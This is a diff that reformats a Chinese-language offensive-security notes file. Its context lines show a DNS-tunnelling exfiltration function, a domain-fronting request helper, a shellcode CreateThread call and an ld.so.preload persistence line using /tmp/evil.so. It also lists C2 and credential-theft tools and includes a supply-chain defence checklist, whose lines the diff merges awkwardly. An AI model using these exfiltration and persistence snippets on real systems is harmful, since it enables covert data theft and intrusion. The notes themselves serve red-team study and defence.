@@ -272,13 +272,21 @@ ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
 
 ```python
 # DNS 隧道
-def dns_exfil(data, domain):
+def dns_exfil(
+        data,
+        domain
+):
     encoded = base64.b32encode(data.encode()).decode()
-    for chunk in [encoded[i:i+63] for i in range(0, len(encoded), 63)]:
+    for chunk in [encoded[i:i + 63] for i in range(0, len(encoded), 63)]:
         dns.resolver.resolve(f"{chunk}.{domain}", 'A')
 
+
 # 域前置
-def domain_fronting(real_host, cdn_domain, data):
+def domain_fronting(
+        real_host,
+        cdn_domain,
+        data
+):
     headers = {"Host": real_host}
     requests.post(f"https://{cdn_domain}/api", json=data, headers=headers)
 ```
@@ -319,15 +327,15 @@ echo "/tmp/evil.so" >> /etc/ld.so.preload
 
 ## 工具清单
 
-| 工具            | 用途           |
-|---------------|--------------|
+| 工具          | 用途             |
+|---------------|------------------|
 | Sliver        | 开源 C2 框架     |
-| Metasploit    | 渗透测试框架       |
-| Cobalt Strike | 商业 C2        |
+| Metasploit    | 渗透测试框架     |
+| Cobalt Strike | 商业 C2          |
 | Impacket      | Windows 协议工具 |
 | CrackMapExec  | 批量横向         |
 | Mimikatz      | 凭证提取         |
-| Rubeus        | Kerberos 工具  |
+| Rubeus        | Kerberos 工具    |
 | BloodHound    | AD 路径分析      |
 
 ## 供应链安全
@@ -340,13 +348,13 @@ echo "/tmp/evil.so" >> /etc/ld.so.preload
    投毒    篡改   后门   劫持   提权   横向
 ```
 
-| 阶段  | 攻击方式     | 示例                        |
-|-----|----------|---------------------------|
-| 源代码 | 依赖投毒     | event-stream、ua-parser-js |
-| 构建  | CI/CD 劫持 | SolarWinds、CodeCov        |
-| 制品  | 恶意包      | PyPI/npm 钓鱼包              |
-| 部署  | 配置篡改     | K8s YAML 注入               |
-| 运行  | 容器逃逸     | 特权容器、内核漏洞                 |
+| 阶段   | 攻击方式   | 示例                       |
+|--------|------------|----------------------------|
+| 源代码 | 依赖投毒   | event-stream、ua-parser-js |
+| 构建   | CI/CD 劫持 | SolarWinds、CodeCov        |
+| 制品   | 恶意包     | PyPI/npm 钓鱼包            |
+| 部署   | 配置篡改   | K8s YAML 注入              |
+| 运行   | 容器逃逸   | 特权容器、内核漏洞         |
 
 ### SBOM + 依赖扫描
 
@@ -380,14 +388,12 @@ Level 3: 安全平台+隔离构建  Level 4: 双方审查+密封构建
 
 ### 供应链安全检查清单
 
-```yaml
+```markdown
 源代码:
-  - [ ] 分支保护 + 代码审查 + 依赖锁定 + 密钥泄露扫描
-构建与制品:
-  - [ ] 托管CI/CD + 隔离构建 + 生成SBOM + 签名制品 + 漏洞扫描
-部署与运行:
-  - [ ] 验证签名(Cosign/SLSA) + 准入控制(Kyverno/OPA) + 运行时监控
+
+- [ ] 分支保护 + 代码审查 + 依赖锁定 + 密钥泄露扫描构建与制品:
+- [ ] 托管CI/CD + 隔离构建 + 生成SBOM + 签名制品 + 漏洞扫描部署与运行:
+- [ ] 验证签名 (Cosign/SLSA) + 准入控制 (Kyverno/OPA) + 运行时监控
 ```
 
 ---
-
